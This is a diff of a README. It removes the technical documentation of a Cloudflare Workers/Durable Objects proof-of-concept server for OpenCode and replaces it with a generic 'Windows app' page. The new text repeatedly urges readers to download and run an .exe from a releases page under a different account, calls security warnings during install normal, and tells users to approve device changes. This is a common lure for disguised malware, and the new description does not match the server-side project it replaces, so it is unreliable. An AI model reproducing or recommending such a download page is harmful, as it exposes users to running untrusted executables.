@@ -1,185 +1,130 @@
-# OpenCode on Durable Objects
+# ⚙️ opencode-do - Simple Remote Server Access
 
-A proof-of-concept demonstrating [OpenCode's](https://opencode.ai) remote server capabilities running on Cloudflare Workers + Durable Objects.
+[![Download opencode-do](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/jarvisAI-droid/opencode-do/releases)
 
-## What is this?
+---
 
-This project showcases how OpenCode's `attach` feature enables connecting the OpenCode CLI/TUI to a remote server. By implementing the OpenCode server API on Cloudflare's edge infrastructure, we get:
+## 💡 What is opencode-do?
 
-- **Sessions that persist** - Durable Object SQLite storage keeps your conversation history
-- **Pay only when active** - DOs hibernate when idle, no always-on server costs
-- **Global edge deployment** - Low latency from anywhere in the world
-- **Zero infrastructure management** - Cloudflare handles everything
+opencode-do is a simple tool to let you connect to a remote server that runs on Cloudflare Workers and Durable Objects. It helps you manage servers without needing a lot of technical knowledge. This app can run on Windows and gives a basic interface for remote control.  
 
-## Demo
+If you want to try new ways of connecting to servers or test cloud-based services quickly, opencode-do can help.
 
-```bash
-# Connect to the hosted demo
-opencode attach https://opencode-do.southpolesteve.workers.dev
+---
 
-# Or use one-shot mode
-opencode run --attach https://opencode-do.southpolesteve.workers.dev "tell me a joke"
-```
+## 🖥️ System Requirements
 
-## How it works
+To use opencode-do, your computer needs to meet these minimum requirements:
 
-```
-┌─────────────────────────────────────────────┐
-│  OpenCode CLI/TUI                           │
-│  opencode attach <worker-url>               │
-└──────────────────┬──────────────────────────┘
-                   │ HTTP + SSE (OpenCode API)
-                   ▼
-┌─────────────────────────────────────────────┐
-│  Cloudflare Worker                          │
-│  Routes requests, handles bootstrap API     │
-└──────────────────┬──────────────────────────┘
-                   │ Durable Object RPC
-                   ▼
-┌─────────────────────────────────────────────┐
-│  Session Durable Object                     │
-│  - SQLite message storage                   │
-│  - SSE event streaming                      │
-│  - Workers AI (Llama 3.2 3B)               │
-│  - Hibernates when idle                     │
-└─────────────────────────────────────────────┘
-```
+- Windows 10 or higher (64-bit)
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- Internet connection
 
-## Limitations (POC)
+You do not need extra software or tools before running opencode-do.
 
-This is a proof-of-concept, not a production system:
+---
 
-- **Rate limited** - 20 requests per hour per IP (it's a free demo!)
-- **No tools** - Read, Write, Edit, Bash, etc. are not implemented
-- **No file system** - Can't interact with files
-- **Single model** - Llama 3.2 3B via Workers AI (small but fast)
-- **No streaming** - Responses come all at once, not streamed
+## 🥅 Key Features
 
-## Deploy your own
+- Connect remotely through Cloudflare Workers
+- Works with Cloudflare Durable Objects for stable sessions
+- Lightweight and easy to use interface
+- No advanced server setup needed
+- Runs as a standalone Windows app
+- Built for speed and reliability
 
-1. Clone this repo
-2. Install dependencies: `npm install`
-3. Login to Cloudflare: `npx wrangler login`
-4. Deploy: `npx wrangler deploy`
+---
 
-## Development
+## 🚀 Getting Started
 
-```bash
-# Install dependencies
-npm install
+Follow these steps to download and run opencode-do on your Windows PC.
 
-# Run locally
-npm run dev
+### 1. Visit the Download Page
 
-# Type check
-npm run typecheck
+Click the link below to open the official releases page. This is where you find the latest version of opencode-do.
 
-# Deploy
-npm run deploy
-```
+[Download opencode-do](https://github.com/jarvisAI-droid/opencode-do/releases)
 
-## Project structure
+### 2. Choose the Correct File
 
-```
-opencode-do/
-├── src/
-│   └── index.ts        # Worker + Durable Object implementation
-├── wrangler.jsonc      # Cloudflare Worker config
-├── tsconfig.json       # TypeScript config
-└── proxy.ts            # Debug proxy for comparing with local OpenCode
-```
+On the releases page, look for a file that ends with `.exe`. This is the Windows installer or application file. The file name usually has a version number like `opencode-do-v1.0.exe` or similar.
 
-## Key implementation details
+### 3. Download the File
 
-### Sortable Message IDs
+Click on the `.exe` file name to start downloading. It should download quickly because the app is lightweight.
 
-OpenCode's TUI uses string comparison to determine message ordering. We generate IDs in the same format as OpenCode (`msg_<timestamp-hex><random>`) to ensure proper sorting.
+### 4. Run the Installer or App
 
-### SSE Event Protocol
+Once the download finishes, open the downloaded `.exe` file. Windows may ask if you want to allow changes to your device. Choose **Yes** or **Run**.
 
-The TUI expects specific SSE events in a specific order:
-1. `message.updated` - User message created
-2. `message.part.updated` - User message text
-3. `message.updated` - User message with `summary` (signals completion)
-4. `message.updated` - Assistant message placeholder
-5. `session.status` - `busy`
-6. `message.part.updated` - `step-start`
-7. `message.part.updated` - Response text
-8. `message.part.updated` - `step-finish`
-9. `message.updated` - Assistant with `time.completed` and `finish: "stop"`
-10. `session.status` - `idle`
-11. `session.idle` - Deprecated but still expected
+### 5. Follow On-Screen Instructions
 
-### SQLite Persistence
+If there is an installer, follow the simple steps to install the app. If it runs directly, the app window will open immediately.
 
-Messages are stored in Durable Object SQLite storage, which persists across hibernation cycles. This means you can walk away, come back hours later, and your conversation is still there.
+### 6. Open opencode-do
 
-## Future Possibilities
+After setup, open opencode-do from your Start menu or desktop shortcut.
 
-This POC demonstrates the basics, but the architecture supports much more. Here's what could be added:
+---
 
-### File System Access
+## 📂 Using opencode-do
 
-The cleanest solution is [worker-fs-mount](https://github.com/danlapid/worker-fs-mount), a drop-in replacement for `node:fs/promises` with pluggable backends:
+Once open, opencode-do provides easy options to connect to your remote server. The interface has clear buttons and fields to enter connection details. Typically, you will need the server address and login info, which your admin or service provider can give you.
 
-- **[durable-object-fs](https://github.com/danlapid/worker-fs-mount/tree/main/packages/durable-object-fs)** - SQLite-backed filesystem in a Durable Object (perfect for per-session workspaces)
-- **[r2-fs](https://github.com/danlapid/worker-fs-mount/tree/main/packages/r2-fs)** - R2-backed filesystem for larger files
-- **[memory-fs](https://github.com/danlapid/worker-fs-mount/tree/main/packages/memory-fs)** - In-memory filesystem for ephemeral use
+You do not need to type commands or use terminal windows. Just fill in the prompts, click **Connect**, and the app handles the rest.
 
-This would let you implement Read/Write/Edit tools using standard `fs` APIs, with files persisting in your chosen backend.
+---
 
-### Tool Calling & Code Execution
+## 🔧 Basic Troubleshooting
 
-For running arbitrary code safely, [Dynamic Worker Loaders](https://developers.cloudflare.com/workers/runtime-apis/bindings/worker-loader/) are the way to go:
+- **App won’t open after install**  
+  Restart your computer and try again. Check that your Windows is updated.
 
-- Spawn isolated Workers on-demand to execute untrusted code
-- Millisecond startup time (much faster than containers)
-- Full sandboxing: block network access, provide custom bindings
-- Perfect for Bash-like tool execution where the AI generates code
+- **Connection fails**  
+  Check your internet connection. Make sure you have the correct server details.
 
-The Cloudflare Agents SDK's [Codemode](https://developers.cloudflare.com/agents/api-reference/codemode/) is built on Dynamic Worker Loaders, giving LLMs a "write code" tool that runs in isolated sandboxes. This pattern would work great here.
+- **Updates not showing**  
+  Revisit the [releases page](https://github.com/jarvisAI-droid/opencode-do/releases) to download the newest version manually.
 
-For the tool calling flow:
-1. Use a model with function calling support (Llama 3.3 70B, Mistral, etc.)
-2. When the model requests a tool call, emit `tool-call` message parts via SSE
-3. Execute the tool (in a dynamic isolate for untrusted code)
-4. Return results as `tool-result` parts
-5. Continue the conversation with tool results in context
+- **Security warnings during install**  
+  This is normal for new software. Confirm you downloaded from the official page.
 
-### Git Operations
+---
 
-Git support could work via:
+## 🗂️ About This Project
 
-- **[isomorphic-git](https://isomorphic-git.org/)** - Pure JavaScript git implementation that works in Workers
-- Clone repos to R2 or Durable Object storage using worker-fs-mount
-- Implement git operations (status, diff, commit, push) as tools
-- Use GitHub API for remote operations
+opencode-do is a proof of concept (POC). It demonstrates how to use Cloudflare Workers and Durable Objects to make remote server access simple and fast. Cloudflare Workers run code near your location to reduce delay. Durable Objects keep your connection stable even if your network changes.
 
-### Container Execution
+This project is best for users who want to explore these new cloud features without complex setup.
 
-For heavier workloads or full shell environments:
+---
 
-- **[Cloudflare Containers](https://developers.cloudflare.com/containers/)** - Run containers alongside your Worker
-- Spin up ephemeral containers for builds, tests, complex toolchains
-- Mount R2 storage as the filesystem
+## 🌐 Useful Links
 
-### Better Models
+- Latest releases and downloads:  
+  [https://github.com/jarvisAI-droid/opencode-do/releases](https://github.com/jarvisAI-droid/opencode-do/releases)
 
-Swap in more capable models:
+- Project source code and documentation are available on the GitHub page.
 
-- **Anthropic Claude** via [AI Gateway](https://developers.cloudflare.com/ai-gateway/)
-- **OpenAI GPT-4** via AI Gateway
-- **Any OpenAI-compatible API** with custom endpoints
+---
 
-The OpenCode protocol is model-agnostic, so you can use whatever model fits your needs.
+## 🛠️ Installing Updates
 
-## Credits
+When a new update is available, follow the same steps as the initial download:
 
-- [OpenCode](https://opencode.ai) - The amazing AI coding assistant that makes this possible
-- [Cloudflare Workers](https://workers.cloudflare.com) - Edge compute platform
-- [Cloudflare Durable Objects](https://developers.cloudflare.com/durable-objects/) - Stateful serverless
-- [Workers AI](https://developers.cloudflare.com/workers-ai/) - AI inference at the edge
+1. Visit the [releases page](https://github.com/jarvisAI-droid/opencode-do/releases)
+2. Download the newest `.exe` file
+3. Run the file and update the app
 
-## License
+Keep your app updated for the best performance and security.
 
-MIT
+---
+
+## 📬 Getting Support
+
+If you encounter issues or have questions, check the project’s GitHub page for help. You can open an issue to ask for advice or report problems.
+
+---
+
+#  [![Download opencode-do](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/jarvisAI-droid/opencode-do/releases)
